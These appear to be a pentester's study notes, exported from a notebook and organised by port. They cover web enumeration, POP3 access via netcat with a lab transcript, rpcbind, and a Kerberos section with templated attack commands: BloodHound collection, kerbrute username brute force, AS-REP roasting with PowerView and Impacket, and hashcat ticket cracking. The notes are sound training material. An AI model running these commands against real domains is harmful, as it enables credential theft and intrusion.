<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.3562in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Wednesday,
April 7, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>2:39
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.575in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Add host names to /etc/hosts
     and visit the host names instead of the IP address.<span
     style='mso-spacerun:yes'>  </span>Can give different results.</span
></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Check headers for more
     evidence of what is running on the server</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Web server version combined
      with OS name can reveal the version of the OS that is running</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Google the OS name &amp;
       web server version.<span style='mso-spacerun:yes'>  </span>Look f
or
       documentation of which version of the OS supports that version of the
       web server.</span></li>
  </ul>
 </ul>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Gobuster:</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Worth trying -x php flag on
      Linux hosts</span></li>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>feroxbuster</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Brute force web directories
      recursively</span></li>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>IIS</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Google version number to
      find which Windows version the host is likely running</span></li>
 </ul>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Curl:</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.1951in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Banner grab</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-i</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.2138in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>If page is
  redirecting, follow it and rerun command (grab header)</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.5354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-L -i</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.1951in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Silent mode.<span
  style='mso-spacerun:yes'>  </span>Do not show progress meter or erro
  messages.</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-s</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>html2text</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Render page in CLI</span></li>
 </ul>
</ul>

<p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>/cgi-bin/ means
mod_cgi is enabled</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>If output is not showing try
     redirecting errors to STDOUT</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>2&gt;&amp;1</span></li>
 </ul>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:9.1687in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.5326in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>88 TCP /
Kerberos</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.2381in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>9:55
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:9.0423in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Enumeration/attacks</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Bloodhound</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.7083in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.168in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>bloodhound.py</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo python3
   bloodhound.py -c all -u &lt;user&gt; -p '&lt;password&gt;' -ns &lt;ip&gt; -d
   &lt;domain name&gt; --zip</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>ForceChangePassword</span></li>
  <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>rpcclient</span></li>
  </ul>
 </ul>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Enumerate AD usernames</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>kerbrute</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:1.0833in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.7791in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate
   username list</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.3222in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>userenum -d
   &lt;domain or ip&gt; &lt;username list&gt;<br>
      - /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Brute force usernames and
      password</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>kerbrute</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>AS-REP Roasting</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Retrieve a ticket for a use
       that has DONT_REQ_PREAUTH enabled and then crack it</span></li>
   <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>DONT_REQ_PREAUTH means the
        DC will provide a TGT without verifying the request for the ticket was
        encrypted by the password of the user that is requesting the TGT.</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Attack can be done from
       machine that is not joined to the domain</span></li>
   <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Enumeration is easier on a
        domain-joined machine - you can use LDAP Filter or PowerView to find
        targets</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Attack from a windows
       machine:</span></li>
   <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>PowerView.ps1 - Enumerate
         Users</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>ASREPRoast.ps1 - Retrieve
         ticket hashes</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Rebeus - C#/.NET
         replacement for ASREPRoast.ps1.<span style='mso-spacerun:yes'>�
         </span>Harder for victim to detect.</span></li>
    </ul>
   </ul>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:1.0833in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.3569in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>??</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get-ADUser
   -Filter 'useraccountcontrol -band 419304' -Properties useraccountcontrol |
   Format-Table name</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.3763in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Powerview -
   Enumerate vulnerable users</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5791in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get-DomainUser
   -PreauthNotRequired -Properties distinguishedname -Verbose</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.3763in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Powerview -
   Enumerate vulnerable users</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5791in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get-DomainUser
   &lt;victimuser&gt; | Convert-FromUACValue</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.3569in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ASREPRoast -
   Retrieve ticket/hash</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get-ASRepHash
   -Domain &lt;domain&gt; -UserName &lt;victim user&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.3569in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Hashcat - Crack
   ticket</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.5986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>hashcat.exe -a 0
   -m 7500 asrep.hash rockyou.txt</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Attack from linux:</span></li>
  <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>User enumeration methods:</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Using LDAP, may need a
        domain users credentials to access.</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Brute force - kerbrute</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Any other means</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Request tickets/retrieve
       hashes using Impacket-GetNPUsers</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Impacket-GetNPUsers -dc-ip
        &lt;ip&gt; &lt;domain&gt;/ -no-pass -usersfile &lt;file&gt; -outputfile
        &lt;file&gt;</span></li>
   </ul>
  </ul>
 </ul>
 <p style='margin:0in;margin-left:1.5in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;margin-left:1.125in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Articles</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><a
       href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting"><span
       style='font-family:Calibri;font-size:11.0pt'>https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting</span></a></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Everything about kerberos
        attacks</span></li>
   </ul>
  </ul>
 </ul>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.575in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.275in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>110 TCP /
POP3</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.0208in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Friday,
May 7, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>1:57
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.575in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Post Office Protocol 3</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Used to receive emails</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>If we can log on to a POP3
      server we can potentially read people's emails</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Logging in can allow us to
      read data, not write</span></li>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Evolution email client can
      be used</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nc -nv &lt;ip address&gt;
      &lt;port&gt;</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nc -nvC </span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>add C flag if not getting a
       response</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>telnet</span></li>
 </ul>
</ul>

<p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9388in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Pick username to
  login with</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.6423in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>USER
  &lt;username&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enter password for
  user</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.6618in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>PASS
  &lt;password&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List emails</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.6618in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LIST</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Read email</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.7312in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>RETR &lt;email #
  from LIST&gt;</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Interacting with POP3 using
     netcat</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>root@kali:~# nc -nvC
      10.11.1.72 110<br>
            </span></li>
 </ul>
</ul>

<p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>(UNKNOWN)
[10.11.1.72] 110 (pop3) open<br>
</p>

<p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>+OK
beta POP3 server (JAMES POP3 Server 2.3.2) ready </p>

<p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>USER
root<br>
+OK</p>

<p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>PASS
alphabet<br>
-ERR Authentication failed.</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:9.1645in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.1798in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>111 TCP /
rpcbind / NFS</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.3986in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
February 8, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>3:33
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:9.1645in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>rpcbind</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>A portmapper</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Should list NFS port</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Like a telephone book,
      similar to DNS, that maps out program numbers to ports</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Listens on port 111.<span
      style='mso-spacerun:yes'>  </span>Maps RPC services to the ports t
hey
      listen on.<span style='mso-spacerun:yes'>  </span>Clients provide 
the
      program number they are trying to access and RPCbind redirects the client
      to the port # for that service.</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
  <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>rpcinfo </span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Utility that will connect
        to the RPC server and report back any information divulged by the
        server.</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Command: rpcinfo &lt;ip
        address&gt;</span></li>
   </ul>
  </ul>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:1.4583in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.8375in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Compact results</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-s</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.8569in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Display all
  registered RP programs and show port numbers</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.5354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-p</p>
  </td>
 </tr>
</table>

</div>

<ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
